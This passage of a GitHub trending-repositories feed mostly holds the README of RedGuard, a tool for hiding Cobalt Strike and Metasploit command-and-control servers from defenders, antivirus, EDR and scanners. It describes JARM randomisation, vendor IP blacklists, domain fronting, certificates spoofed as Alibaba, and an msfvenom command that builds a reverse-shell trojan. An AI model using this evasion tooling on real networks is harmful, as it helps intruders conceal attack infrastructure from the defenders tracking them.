$PGDATA/postgres.log -o &#34;--unix_socket_directories=&#39;$PWD&#39;&#34; start&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Now you can run tests or compile code as usual.&lt;/p&gt; &#xA;&lt;h3&gt;Tips&lt;/h3&gt; &#xA;&lt;p&gt;For more tips on how to build and test Chainlink, see our &lt;a href=&#34;https://github.com/smartcontractkit/chainlink/wiki/Development-Tips&#34;&gt;development tips page&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Contributing&lt;/h3&gt; &#xA;&lt;p&gt;Chainlink&#39;s source code is &lt;a href=&#34;https://raw.githubusercontent.com/smartcontractkit/chainlink/develop/LICENSE&#34;&gt;licensed under the MIT License&lt;/a&gt;, and contributions are welcome.&lt;/p&gt; &#xA;&lt;p&gt;Please check out our &lt;a href=&#34;https://raw.githubusercontent.com/smartcontractkit/chainlink/develop/docs/CONTRIBUTING.md&#34;&gt;contributing guidelines&lt;/a&gt; for more details.&lt;/p&gt; &#xA;&lt;p&gt;Thank you!&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://choosealicense.com/licenses/mit/&#34;&gt;MIT&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>wikiZ/RedGuard</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/wikiZ/RedGuard</id>
    <link href="https://github.com/wikiZ/RedGuard" rel="alternate"></link>
    <summary type="html">&lt;p&gt;RedGuard is a C2 front flow control tool,Can avoid Blue Teams,AVs,EDRs check.&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt;RedGuard - Excellent C2 Front Flow Control tool&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/knownsec/Kunyu&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/stars/wikiZ/RedGuard&#34; alt=&#34;GitHub stars&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/knownsec/Kunyu/issues&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/issues/wikiZ/RedGuard&#34; alt=&#34;GitHub issues&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/knownsec/Kunyu/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/release/wikiZ/RedGuard&#34; alt=&#34;GitHub release&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/wikiZ&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/author-%E9%A3%8E%E8%B5%B7-blueviolet&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;English | &lt;a href=&#34;https://github.com/wikiZ/RedGuard/raw/main/doc/README_CN.md&#34;&gt;中文文档&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;0x00 Introduction&lt;/h1&gt; &#xA;&lt;h2&gt;Tool introduction&lt;/h2&gt; &#xA;&lt;p&gt;RedGuard is a derivative work of the C2 facility pre-flow control technology. It has a lighter design, efficient flow interaction, and reliable compatibility with go language development. The core problem it solves is also in the face of increasingly complex red and blue attack and defense drills, giving the attack team a better C2 infrastructure concealment scheme, giving the interactive traffic of the C2 facility a flow control function, and intercepting those &#34;malicious&#34; analysis traffic, and better complete the entire attack mission.&lt;/p&gt; &#xA;&lt;p&gt;RedGuard is a C2 facility pre-flow control tool that can avoid Blue Team, AVS, EDR, Cyberspace Search Engine checks.&lt;/p&gt; &#xA;&lt;h2&gt;Application scenarios&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;During the offensive and defensive drills, the defender analyzes and traces the source of C2 interaction traffic according to the situational awareness platform&lt;/li&gt; &#xA; &lt;li&gt;Prevent malicious analysis of Trojan samples in cloud sandbox environment&lt;/li&gt; &#xA; &lt;li&gt;Block malicious requests to implement replay attacks and achieve the effect of confusing online&lt;/li&gt; &#xA; &lt;li&gt;In the case of specifying the IP of the online server, the request to access the interactive traffic is restricted by means of a whitelist&lt;/li&gt; &#xA; &lt;li&gt;Prevent the scanning and identification of C2 facilities by cyberspace mapping technology, and redirect or intercept the traffic of scanning probes&lt;/li&gt; &#xA; &lt;li&gt;Supports pre-flow control for multiple C2 servers, and can achieve the effect of domain front-end, load balancing online, and achieve the effect of concealment&lt;/li&gt; &#xA; &lt;li&gt;Able to perform regional host online restriction according to the attribution of IP address by requesting IP reverse lookup API interface&lt;/li&gt; &#xA; &lt;li&gt;Analyze blue team tracing behavior through interception logs of target requests, which can be used to track peer connection events/issues&lt;/li&gt; &#xA; &lt;li&gt;It has the function of customizing the time period for the legal interaction of the sample to realize the function of only conducting traffic interaction during the working time period&lt;/li&gt; &#xA; &lt;li&gt;Malleable C2 Profile parser capable of validating inbound HTTP/S requests strictly against malleable profile and dropping outgoing packets in case of violation (supports Malleable Profiles 4.0+)&lt;/li&gt; &#xA; &lt;li&gt;Built-in blacklist of IPV4 addresses for a large number of devices, honeypots, and cloud sandboxes associated with security vendors to automatically intercept redirection request traffic&lt;/li&gt; &#xA; &lt;li&gt;SSL certificate information and redirect URLs that can interact with samples through custom tools to circumvent the fixed characteristics of tool traffic&lt;/li&gt; &#xA; &lt;li&gt;..........&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;0x01 Install&lt;/h1&gt; &#xA;&lt;p&gt;You can directly download and use the compiled version, or you can download the go package remotely for independent compilation and execution.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/wikiZ/RedGuard.git&#xA;cd RedGuard&#xA;# You can also use upx to compress the compiled file size&#xA;go build -ldflags &#34;-s -w&#34;&#xA;# Give the tool executable permission and perform initialization operations&#xA;chmod +x ./RedGuard&amp;amp;&amp;amp;./RedGuard&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;0x02 Configuration Description&lt;/h1&gt; &#xA;&lt;h2&gt;initialization&lt;/h2&gt; &#xA;&lt;p&gt;As shown in the figure below, first grant executable permissions to RedGuard and perform initialization operations. The first run will generate a configuration file in the current user directory to achieve flexible function configuration. Configuration file name: &lt;strong&gt;.RedGuard_CobaltStrike.ini&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521151731-13f938b8-d8d6-1.png&#34; alt=&#34;1653117445(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Configuration file content:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521152151-af330f34-d8d6-1.png&#34; alt=&#34;1653117707(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The configuration options of cert are mainly for the configuration information of the HTTPS traffic exchange certificate between the sample and the C2 front-end facility. The proxy is mainly used to configure the control options in the reverse proxy traffic. The specific use will be explained in detail below.&lt;/p&gt; &#xA;&lt;p&gt;The SSL certificate used in the traffic interaction will be generated in the cert-rsa/ directory under the directory where RedGuard is executed. You can start and stop the basic functions of the tool by modifying the configuration file &lt;strong&gt;(the serial number of the certificate is generated according to the timestamp , don&#39;t worry about being associated with this feature)&lt;/strong&gt;.If you want to use your own certificate,Just rename them to ca.crt and ca.key.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;openssl x509 -in ca.crt -noout -text&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521153216-23d83cd2-d8d8-1.png&#34; alt=&#34;1653118330(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Random TLS JARM fingerprints are updated each time RedGuard is started to prevent this from being used to authenticate C2 facilities.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/d2d8d30fcd349bd4567c685aaa93451.jpg&#34; alt=&#34;1653118330(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;RedGuard Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@VM-4-13-ubuntu:~# ./RedGuard -h&#xA;&#xA;Usage of ./RedGuard:&#xA;  -allowIP string&#xA;        Proxy Requests Allow IP (default &#34;*&#34;)&#xA;  -allowLocation string&#xA;        Proxy Requests Allow Location (default &#34;*&#34;)&#xA;  -allowTime string&#xA;        Proxy Requests Allow Time (default &#34;*&#34;)&#xA;  -common string&#xA;        Cert CommonName (default &#34;*.aliyun.com&#34;)&#xA;  -country string&#xA;        Cert Country (default &#34;CN&#34;)&#xA;  -dns string&#xA;        Cert DNSName&#xA;  -drop string&#xA;        Proxy Filter Enable DROP (default &#34;false&#34;)&#xA;  -host string&#xA;        Set Proxy HostTarget&#xA;  -http string&#xA;        Set Proxy HTTP Port (default &#34;:80&#34;)&#xA;  -https string&#xA;        Set Proxy HTTPS Port (default &#34;:443&#34;)&#xA;  -ip string&#xA;        IPLookUP IP&#xA;  -locality string&#xA;        Cert Locality (default &#34;HangZhou&#34;)&#xA;  -location string&#xA;        IPLookUP Location (default &#34;风起&#34;)&#xA;  -malleable string&#xA;        Set Proxy Requests Filter Malleable File (default &#34;*&#34;)&#xA;  -organization string&#xA;        Cert Organization (default &#34;Alibaba (China) Technology Co., Ltd.&#34;)&#xA;  -redirect string&#xA;        Proxy redirect URL (default &#34;https://360.net&#34;)&#xA;  -type string&#xA;        C2 Server Type (default &#34;CobaltStrike&#34;)&#xA;  -u    Enable configuration file modification&#xA;  &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;**P.S. You can use the parameter command to modify the configuration file. Of course, I think it may be more convenient to modify it manually with vim. **&lt;/p&gt; &#xA;&lt;h1&gt;0x03 Tool usage&lt;/h1&gt; &#xA;&lt;h2&gt;basic interception&lt;/h2&gt; &#xA;&lt;p&gt;If you directly access the port of the reverse proxy, the interception rule will be triggered. Here you can see the root directory of the client request through the output log, but because the request process does not carry the requested credentials, that is, the correct HOST request header So the basic interception rule is triggered, and the traffic is redirected to &lt;a href=&#34;https://360.net&#34;&gt;https://360.net&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Here, in order to facilitate the display of the output effect, the actual use can be run in the background through &lt;code&gt;nohup ./RedGuard &amp;amp;&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521185753-dd1280a6-d8f4-1.png&#34; alt=&#34;1653130661(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;{&#34;360.net&#34;:&#34;http://127.0.0.1:8080&#34;,&#34;360.com&#34;:&#34;https://127.0.0.1:4433&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is not difficult to see from the above slice that 360.net corresponds to the proxy to the local port 8080, 360.com points to the local port 4433, and corresponds to the difference in the HTTP protocol used. In the subsequent online, you need to pay attention to the protocol of the listener. The type needs to be consistent with the one set here, and set the corresponding HOST request header.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521191828-bd41a344-d8f7-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;As shown in the figure above, in the case of unauthorized access, the response information we get is also the return information of the redirected site.&lt;/p&gt; &#xA;&lt;h2&gt;interception method&lt;/h2&gt; &#xA;&lt;p&gt;In the above basic interception case, the default interception method is used, that is, the illegal traffic is intercepted by redirection. By modifying the configuration file, we can change the interception method and the redirected site URL. In fact, this The other way is a redirect, which might be more aptly described as hijacking, cloning, since the response status code returned is 200, and the response is taken from another website to mimic the cloned/hijacked website as closely as possible.&lt;/p&gt; &#xA;&lt;p&gt;Invalid packets can be misrouted according to two strategies:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;reset&lt;/strong&gt;: Terminate the TCP connection immediately.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;proxy&lt;/strong&gt;: Get a response from another website to mimic the cloned/hijacked website as closely as possible.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Determines whether to intercept intercepted traffic default false / true&#xA;DROP = false&#xA;# URL to redirect to&#xA;Redirect = https://360.net&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Redirect = URL&lt;/strong&gt; in the configuration file points to the hijacked URL address. RedGuard supports &#34;hot change&#34;, which means that while the tool is running in the background through nohup, we can still modify the configuration file. The content is started and stopped in real time.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./RedGuard -u --drop true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that when modifying the configuration file through the command line. The -u option should not be too small, otherwise the configuration file cannot be modified successfully. If you need to restore the default configuration file settings, you only need to enter &lt;code&gt;./RedGuard -u&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Another interception method is DROP, which directly closes the HTTP communication response and is enabled by setting &lt;strong&gt;DROP = true&lt;/strong&gt;. The specific interception effect is as follows:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521193245-bc078708-d8f9-1.png&#34; alt=&#34;1653132755(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;It can be seen that the C2 pre-flow control directly responds to illegal requests without the HTTP response code. In the detection of cyberspace mapping, the DROP method can achieve the function of hiding the opening of ports. The specific effect can be seen in the following case. analyze.&lt;/p&gt; &#xA;&lt;h2&gt;Proxy port modification&lt;/h2&gt; &#xA;&lt;p&gt;In fact, it is easy to understand here. The configuration of the following two parameters in the configuration file realizes the effect of changing the reverse proxy port. It is recommended to use the default port on the premise of not conflicting with the current server port. If it must be modified, then pay attention to the &lt;strong&gt;:&lt;/strong&gt; of the parameter value not to be missing&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# HTTPS Reverse proxy port&#xA;Port_HTTPS = :443&#xA;# HTTP Reverse proxy port&#xA;Port_HTTP = :80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;RedGuard logs&lt;/h2&gt; &#xA;&lt;p&gt;The blue team tracing behavior is analyzed through the interception log of the target request, which can be used to track peer connection events/problems. The log file is generated in the directory where RedGuard is running, &lt;strong&gt;file name: RedGuard.log&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220523104050-c1c67296-da41-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Request geographic restrictions&lt;/h2&gt; &#xA;&lt;p&gt;The configuration method takes AllowLocation = Jinan, Beijing as an example. It is worth noting here that RedGuard provides two APIs for IP attribution anti-check, one for domestic users and the other for overseas users. Dynamically assign which API to use. If the target is in China, enter Chinese for the set region. Otherwise, enter English place names. It is recommended that domestic users use Chinese names. In this way, the accuracy of the attribution found and the response speed of the API are both is the best choice.&lt;/p&gt; &#xA;&lt;p&gt;P.S. Domestic users, do not use &lt;strong&gt;AllowLocation = Jinan,beijing&lt;/strong&gt; this way! It doesn&#39;t make much sense, the first character of the parameter value determines which API to use!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# IP address owning restrictions example:AllowLocation = 山东,上海,杭州 or shanghai,beijing&#xA;AllowLocation = *&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521195609-00f19fb8-d8fd-1.png&#34; alt=&#34;1653134160(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Before deciding to restrict the region, you can manually query the IP address by the following command.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./RedGuard --ip 111.14.218.206&#xA;./RedGuard --ip 111.14.218.206 --location shandong # Use overseas API to query&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Here we set to allow only the Shandong region to go online&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521200158-d0d34d6c-d8fd-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Legit traffic:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521205147-c6bb200a-d904-1.png&#34; alt=&#34;1653137496(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Illegal request area:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220521205347-0dbc1efa-d905-1.png&#34; alt=&#34;1653137621(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Regarding the launch of geographical restrictions, it may be more practical in the current offensive and defensive drills. Basically, the targets of provincial and municipal protection network restrictions are in designated areas, and the traffic requested by other areas can naturally be ignored, and the function of RedGuard is Not only can a single region be restricted, but multiple online regions can be restricted based on provinces and cities, and traffic requested by other regions can be intercepted.&lt;/p&gt; &#xA;&lt;h2&gt;Blocking based on whitelist&lt;/h2&gt; &#xA;&lt;p&gt;In addition to the built-in blacklist of security vendor IPs in RedGuard, we can also restrict according to the whitelist. In fact, I also suggest that when doing web management, we can restrict the addresses of the online IPs according to the whitelist, so as to divide multiple IPs way of address.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Whitelist list example: AllowIP = 172.16.1.1,192.168.1.1&#xA;AllowIP       = 127.0.0.1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522133017-43a90ce0-d990-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;As shown in the figure above, we only allow 127.0.0.1 to go online, then the request traffic of other IPs will be intercepted.&lt;/p&gt; &#xA;&lt;h2&gt;Block based on time period&lt;/h2&gt; &#xA;&lt;p&gt;This function is more interesting. Setting the following parameter values in the configuration file means that the traffic control facility can only go online from 8:00 am to 9:00 pm. The specific application scenario here is that during the specified attack time, we allow communication with C2 Traffic interacts, and remains silent at other times. This also allows the red teams to get a good night&#39;s sleep without worrying about some blue team on the night shift being bored to analyze your Trojan and then wake up to something indescribable, hahaha.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Limit the time of requests example: AllowTime = 8:00 - 16:00&#xA;AllowTime     = 8:00 - 21：00&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522133644-2a6054c2-d991-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Malleable Profile&lt;/h2&gt; &#xA;&lt;p&gt;RedGuard uses the Malleable C2 profile. It then parses the provided malleable configuration file section to understand the contract and pass only those inbound requests that satisfy it, while misleading others. Parts such as &lt;code&gt;http-stager&lt;/code&gt;, &lt;code&gt;http-get&lt;/code&gt; and &lt;code&gt;http-post&lt;/code&gt; and their corresponding uris, headers, User-Agent etc. are used to distinguish legitimate beacon requests from irrelevant Internet noise or IR/AV/EDR Out-of-bounds packet.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# C2 Malleable File Path&#xA;MalleableFile = /root/cobaltstrike/Malleable.profile&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522134214-ef2c5ae4-d991-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The profile written by 风起 is recommended to use:&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://github.com/wikiZ/CobaltStrike-Malleable-Profile&#34;&gt;https://github.com/wikiZ/CobaltStrike-Malleable-Profile&lt;/a&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;0x04 Case Study&lt;/h1&gt; &#xA;&lt;h2&gt;Cyberspace Search Engine&lt;/h2&gt; &#xA;&lt;p&gt;As shown in the figure below, when our interception rule is set to DROP, the spatial mapping system probe will probe the / directory of our reverse proxy port several times. In theory, the request packet sent by mapping is faked as normal traffic. Show. But after several attempts, because the characteristics of the request packet do not meet the release requirements of RedGuard, they are all responded by Close HTTP. The final effect displayed on the surveying and mapping platform is that the reverse proxy port is not open.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522135625-ea658a42-d993-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The traffic shown in the figure below means that when the interception rule is set to Redirect, we will find that when the mapping probe receives a response, it will continue to scan our directory. UserAgent is random, which seems to be in line with normal traffic requests, but both successfully blocked.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522140326-e5723b4c-d994-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Surveying and mapping platform - effect of redirection interception:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522142048-526e916c-d997-1.png&#34; alt=&#34;1653200439(1).jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Domain fronting&lt;/h2&gt; &#xA;&lt;p&gt;RedGuard supports Domain fronting. In my opinion, there are two forms of presentation. One is to use the traditional Domain fronting method, which can be achieved by setting the port of our reverse proxy in the site-wide acceleration back-to-source address. On the original basis, the function of traffic control is added to the domain fronting, and it can be redirected to the specified URL according to the setting we set to make it look more real. It should be noted that the RedGuard setting of the HTTPS HOST header must be consistent with the domain name of the site-wide acceleration.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522143012-a26ab442-d998-1.png&#34; alt=&#34;1653201007(1).png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;In individual combat, I suggest that the above method can be used, and in team tasks, it can also be achieved by self-built &#34;Domain fronting&#34;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522143837-cf77a944-d999-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;In the self-built Domain fronting, keep multiple reverse proxy ports consistent, and the HOST header consistently points to the real C2 server listening port of the backend. In this way, our real C2 server can be well hidden, and the server of the reverse proxy can only open the proxy port by configuring the firewall.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522144944-5cb4032e-d99b-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;This can be achieved through multiple node servers, and configure multiple IPs of our nodes in the CS listener HTTPS online IP.&lt;/p&gt; &#xA;&lt;h2&gt;CobaltStrike&lt;/h2&gt; &#xA;&lt;p&gt;If there is a problem with the above method, the actual online C2 server cannot be directly intercepted by the firewall, because the actual load balancing request in the reverse proxy is made by the IP of the cloud server manufacturer.&lt;/p&gt; &#xA;&lt;p&gt;If it is a single soldier, we can set an interception strategy on the cloud server firewall.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522150356-58b9586c-d99d-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Then set the address pointed to by the proxy to &lt;a href=&#34;https://127.0.0.1:4433&#34;&gt;https://127.0.0.1:4433&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;{&#34;360.net&#34;:&#34;http://127.0.0.1:8080&#34;,&#34;360.com&#34;:&#34;https://127.0.0.1:4433&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And because our basic verification is based on the HTTP HOST request header, what we see in the HTTP traffic is also the same as the domain fronting method, but the cost is lower, and only one cloud server is needed.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522150942-26f6c264-d99e-1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;For the listener settings, the online port is set to the RedGuard reverse proxy port, and the listening port is the actual online port of the local machine.&lt;/p&gt; &#xA;&lt;h2&gt;Metasploit&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Generates Trojan&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ msfvenom -p windows/meterpreter/reverse_https LHOST=vpsip LPORT=443 HttpHostHeader=360.com &#xA;-f exe -o ~/path/to/payload.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Of course, as a domain fronting scenario, you can also configure your LHOST to use any domain name of the manufacturer&#39;s CDN, and pay attention to setting the HttpHostHeader to match RedGuard.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;setg OverrideLHOST 360.com&#xA;setg OverrideLPORT 443&#xA;setg OverrideRequestHost true&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is important to note that the &lt;code&gt;OverrideRequestHost&lt;/code&gt; setting must be set to &lt;code&gt;true&lt;/code&gt;. This is due to a quirk in the way Metasploit handles incoming HTTP/S requests by default when generating configuration for staging payloads. By default, Metasploit uses the incoming request&#39;s &lt;code&gt;Host&lt;/code&gt; header value (if present) for second-stage configuration instead of the &lt;code&gt;LHOST&lt;/code&gt; parameter. Therefore, the build stage is configured to send requests directly to your hidden domain name because CloudFront passes your internal domain in the &lt;code&gt;Host&lt;/code&gt; header of forwarded requests. This is clearly not what we are asking for. Using the &lt;code&gt;OverrideRequestHost&lt;/code&gt; configuration value, we can force Metasploit to ignore the incoming &lt;code&gt;Host&lt;/code&gt; header and instead use the &lt;code&gt;LHOST&lt;/code&gt; configuration value pointing to the origin CloudFront domain.&lt;/p&gt; &#xA;&lt;p&gt;The listener is set to the actual line port that matches the address RedGuard actually forwards to.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/73315c83562826f16f64e2b277736c1.png&#34; alt=&#34;867551fe860b10ca1396498a85422b4.jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;RedGuard received the request:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/159a00e6c5596bc3542701b4a8020b1.png&#34; alt=&#34;867551fe860b10ca1396498a85422b4.jpg&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;0x05 Loading&lt;/h1&gt; &#xA;&lt;p&gt;Thank you for your support. RedGuard will continue to improve and update it. I hope that RedGuard can be known to more security practitioners. The tool refers to the design ideas of RedWarden.&lt;/p&gt; &#xA;&lt;p&gt;**We welcome everyone to put forward your needs, RedGuard will continue to grow and improve in these needs! **&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;About the developer 风起 related articles:&lt;a href=&#34;https://www.anquanke.com/member.html?memberId=148652&#34;&gt;https://www.anquanke.com/member.html?memberId=148652&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Kunyu: &lt;a href=&#34;https://github.com/knownsec/Kunyu&#34;&gt;https://github.com/knownsec/Kunyu&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;风起于青萍之末，浪成于微澜之间。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h1&gt;0x06 Community&lt;/h1&gt; &#xA;&lt;p&gt;If you have any questions or requirements, you can submit an issue under the project, or contact the tool author by adding WeCat.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/wikiZ/RedGuardImage/raw/main/20220522141706-ce37e178-d996-1.png&#34; alt=&#34;867551fe860b10ca1396498a85422b4.jpg&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>knadh/listmonk</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/knadh/listmonk</id>
    <link href="https://github.com/knadh/listmonk" rel="alternate"></link>
